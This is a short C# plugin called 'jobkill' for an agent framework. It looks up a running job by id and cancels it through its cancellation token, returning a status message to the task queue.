using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "jobkill";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {

            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            ServerJob jobToKill;

            if (!this.messageManager.TryGetJob(args["id"], out jobToKill)){
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Job not found.",
                    completed = true
                });
                return;
            }

            jobToKill.cancellationtokensource.Cancel();
            
            await messageManager.AddResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = "Cancellation request sent.",
                completed = true
            });
        }
    }
}
